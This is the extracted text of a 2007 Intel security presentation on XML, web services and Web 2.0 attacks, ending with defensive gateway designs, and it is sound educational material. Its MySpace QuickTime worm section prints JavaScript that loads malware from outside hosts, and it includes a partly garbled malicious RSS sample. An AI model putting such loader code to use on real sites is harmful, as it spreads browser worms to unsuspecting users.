X-Malware
Although looking like a real XML document, this XML Viruses contain malicious code that can be activated by 
trying to parse the file
Oversize 
Payloads & 
XDOS 
While an developers may try to limit the size of a document, there are a number of reasons to have XML 
documents that are hundreds of megabytes or gigabytes in size. Parsers based on the DOM model are especially 
susceptible to this attack given its need to model the entire document in memory prior to parsing
Replay 
Attacks
A hacker can issue repetitive SOAP message requests in a bid to overload a Web service. This type of network 
activity will not be detected as an intrusion because the source IP is valid, the network packet behavior is valid 
and the HTTP request is well formed. However, the business behavior is not legitimate and constitutes an XML- 
based intrusion. In this manner, a completely valid XML payloads can be used to issue a denial of service attack.
Routing 
Detour
The WS-Routing specification provides a way to direct XML traffic through a complex environment. It operates by 
allowing an interim way station in an XML path to assign routing instructions to an XML document. If one of these 
web services way stations is compromised, it may participate in a man-in-the-middle attack by inserting bogus 
routing instructions to point a confidential document to a malicious location. From that location, then, it may be 
possible to forward on the document, after stripping out the malicious instructions, to its original destination.
Source: Pete Lindstrom, Research Director for Spire, January 2004 
www.forumsystems.com/papers/Attacking_and_Defending_WS.pdf
Future & Next Generation Attacks
More Backend targeted Attacks
•
Exploit Known Vulnerabilities in ERP, CRM, Mainframe, Databases
•
Using Web Services as the Attack carrier
Emergence of Multi-Phase Attacks
•
Leverage the distributed nature of Web Services & persistence of XML documents to 
execute complex multi-target attacks
•
Examples:
– 
DNS Poisoning for CA Server + Fraudulently signed XML transactions
– 
Specially crafted Malware delivery methods using XML
– 
Advanced Phishing and Pharming using XSS in XML
Universal Tunnel Abuse
•
Universal tunnel is where an attacker or as in many cases a insider with ‘good’ 
intentions uses XML and Web Services to expose internal or blocked protocols to the 
outside. 
•
XML Web Services will implement existing network protocols leading to misuse and 
piggybacking of:
– FTP/Telnet/SSH/SCP/RDP/IMAP…
Web 2.0 Attacks
Web 2.0 Attacks
Web 2.0 and RIA (Rich Internet Applications)
•AJAX Vulnerabilities
•RSS based Threats
•XSS Worms – Sammy, QT/MySpace
Quick AJAX Overview
Source: Billy Hoffman Lead Security Researcher 
for SPI Dynamics (www.spidynamics.com)
AJAX Vulnerabilities: Information Leakage
The JavaScript in the Ajax engine traps the user commands and makes
function calls in clear text to the server. 
Examples of user commands:
• Return price for product ID 24
• Return valid cities for a given state
• Return last valid address for user ID 78
• Update user’s age in database
Function calls provide “how to” information for each user command that is sent. 
•
Is sent in clear text
The attacker can obtain:
•
Function names, variable names, function parameters, return types, data types, 
and valid data ranges.
Source: Billy Hoffman Lead Security Researcher 
for SPI Dynamics (www.spidynamics.com)
AJAX Vulnerabilities: 
Repudiation of Requests and Cross-Site Scripting
Browser requests and Ajax engine requests look identical. 
•
Server are incapable of discerning a request made by JavaScript and a 
request made in response to a user action. 
•
Very difficult for an individual to prove that they did not do a certain action.
•
JavaScript can make a request for a resource using Ajax that occurs in the 
background without the user’s knowledge.
– 
The browser will automatically add the necessary authentication or state-keeping 
information such as cookies to the request. 
•
JavaScript code can then access the response to this hidden request and then 
send more requests. 
This expanded JavaScript functionality increases the damage of a 
Cross-Site Scripting (XSS) attack.
Source: Billy Hoffman Lead Security Researcher 
for SPI Dynamics (www.spidynamics.com)
AJAX Vulnerabilities: Ajax Bridging
The host can provide a Web service that acts as a proxy to forward traffic 
between the JavaScript running on the client and the third-party site.
– 
A bridge could be considered a “Web service to Web service” connection.
– 
Microsoft’s “Atlas,” provide support for Ajax bridging. 
– 
Custom solutions using PHP or Common Gateway Interfaces (CGI) programs can also 
provide bridging.
An Ajax bridge can connect to any Web service on any host using protocols 
such as:
– 
SOAP & REST 
– 
Custom Web services
– 
Arbitrary Web resources such as RSS feeds, HTML, Flash, or even binary content.
An attacker can send malicious requests through the Ajax bridge as 
well as take advantage of elevated privileges often given to the 
Bridge‘s original target.
Source: Billy Hoffman Lead Security Researcher 
for SPI Dynamics (www.spidynamics.com)
RSS Feeds: Attack Delivery Service
RSS Feeds provide links and content to RSS enabled apps and 
aggregators
Malicious links and content can be delivered via the RSS method
Can be used to deliver XSS and XML Injection attacks
Can be used to deliver malicious code (Both Script and encoded 
Binary)
Source: Steve Orrin
Malicious RSS Example
XML.com
http://www.xml.com/
XML.com features a rich mix of information and services for the XML community.
en-us
'>&y="/>
Normalizing XML, Part 2
http://www.xml.com/pub/a/2002/12/04/normalizing.html
In this second and final look at applying relational normalization techniques to W3C XML Schema data modeling, Will Provost discusses 
when not to normalize, the scope of uniqueness and the fourth and fifth normal forms.
Will Provost
2002-12-04    
Source: Steve Orrin
XSS Worms
Using a website to host the malware code, XSS worms and viruses take control over a web 
browser and propagate by forcing it to copy the malware to other locations on the  Web to 
infect others. 
For example, a blog comment laced with malware could snare visitors, commanding their 
browsers to post additional infectious blog comments. 
– 
XSS malware payloads could force the browser to send email, transfer money, delete/modify data, 
hack other websites, download illegal content, and many other forms of malicious activity.
On October 4, 2005, The  Samy Worm, the first major worm of its kind, spread by  
exploiting a persistent Cross-Site Scripting vulnerability in MySpace.com’s personal profile 
web page template.
Source Jeremiah Grossman CTO WhiteHat Security 
http://www.whitehatsec.com
http://www.whitehatsec.com/downloads/WHXSSThreats.pdf
MySpace QT Worm
MySpace allows users to embed movies and other multimedia into their user profiles. 
Apple’s Quicktime movies have a feature known as HREF tracks, which allow users to embed a 
URL into an interactive movie. 
The attacker inserted malicious JavaScript into this Quicktime feature so that when the movie 
is played the evil code is executed.
javascript:
void((
function() {
//create a new SCRIPT tag
var e=window.document.createElement('script');
var ll=new Array();
ll[0]='http://www.daviddraftsystem.com/images/';
ll[1]='http://www.tm-group.co.uk/images/';
//Randomly select a host that is serving the full code of the malware
var lll=ll[Math.floor(2*(Math.random()%1))];
//set the SRC attribute to the remote site
e.setAttribute('src',lll+'js.js');
//append the SCRIPT tag to the current document. The current document would be whatever webpage   
//contains the embedded movie, in this case, a MySpace profile page. This causes the full code of the malware to 
execute.
window.document.body.appendChild(e);
})
Source code from BurntPickle http://www.myspace.com/burntpickle)
Comments and formatting by SPI Dynamics (http://www.spidynamics.com)
Evolving Security Threats
Reconnaissance
Sniffing
Masquerading
Insertion
Injection
xDoS Attacks
Sophistication of Tools
Detect Web 
Services
Capture Web
Services Traffic
Stealth Session 
Hijack
Insert Malicious 
Traffic
Disruption of
Service
Network Scanners
WSDL Scanning
Packet &
Traffic Sniffers
Routing Detours
Replay Attacks
XSS in XML
XPath
Injection
RSS Attacks
AJAX Attacks
Quadratic Blowup
Schema Poisoning
Web2.0 Worms
Multi-Phase/
Universal Tunnel
Targeted Viruses, 
Trojans, 
Redirectors,
XML-CodeRed
????
The Evolving Environment
De-Perimeterization
XML, Web Services & Web 2.0 Apps are more than just different 
classes of network traffic
XML, Web Services & Web 2.0 represent a crucial paradigm shift of the 
network perimeter.  
Applications and Data Reside EVERYWHERE!
Unprotected Perimeter
Internet, Intranet 
and/or Extranet
Perimeter 
& DMZ
Web (HTTP)
Distribution
Layer
Application (XML)
Web Services Layer 
(XML  
Traffic)
NIDP
Netegrity
Oracle
DB
Layer 
VPN 
Termination
SSL
Termination
Firewall
SOAP
TCP/IP
Network Threats
Evolution of Web Services Security
Proxy solutions:
WS Security Gateway
SOAP Gateway
SOA Gateway
XML Firewall
Trust Enablement
Threat Mitigation
1st Gen
2nd Gen
XML Transparent IPS 
(Threat Prevention)
Near-zero provisioning
Wire-speed performance
Streaming XML threat prevention
Known & unknown threats
Heuristics, Anomaly, Policy 
based
XML Proxy Trust Gateway
(Trust Enablement)
Web services AAA
Integration with IA&M
Integrity & Confidentiality
Message Level Security 
Centralized security 
policy
Net Ops
Sec Ops
App Ops
Internet, Intranet 
and/or Extranet
Perimeter 
& DMZ
Web (HTTP)
Distribution
Layer
Application (XML)
Web Services Layer 
(XML  
Traffic)
Netegrity
Oracle
DB
Layer 
XML Proxy 
Trust Gateway
XML
Network Threats
XML Threat Mitigated!
XML Authenticated & Encrypted!
Internet, Intranet 
and/or Extranet
Perimeter 
& DMZ
(XML  
Traffic)
Transparent 
XML IPS
XML / Web Services Security: 
2nd Generation
• Functional boundary split
• Internal and External threat protected
• Transparent Threat Prevention
• Application-aware Trust Assurance
Summary
We are in a rapidly changing environment with SOA going mainstream and Web 
2.0 sites/apps in use by millions.
As with every technology evolution and revolution new and continuously evolving 
threats abound. These threats equally target our systems, data, and users.
We as an industry need to collaborate to identify new threats and use the Threat 
Model as a means to easily classify and inform our customers, partners, IT and 
developers on the attacks and how to mitigate them.
Finally we need to understand that SOA and Web 2.0 are pervasive throughout the 
enterprise and in use at the client, therefore we must address these issues early in 
the SDL at all of the target points.
Q&A
For More Information:
Steve Orrin
Director of Security Solutions
SSG-SPI
Intel Corporation
PI:EMAIL
Thank you!
Notices
Intel and the Intel logo are trademarks or registered trademarks of 
Intel Corporation or its subsidiaries in the United States and other countries.
*Other names and brands may be claimed as the property of others.
**The threats and attack examples provided in this presentation are intended as examples only. They are not functional and cannot be used 
to create security attacks. They are not be replicated and/or modified for use in any illegal or malicious activity. "
*** Performance tests and ratings are measured using specific computer systems and/or components and reflect the approximate 
performance of Intel products as measured by those tests. Any difference in system hardware or software design or configuration may 
affect actual performance. All dates and product descriptions provided are subject to change without notice.  This slide may contain certain 
forward-looking statements that are subject to known and unknown risks and uncertainties that could cause actual results to differ 
materially from those expressed or implied by such statements
Copyright © 2007  Intel Corporation. All Rights Reserved.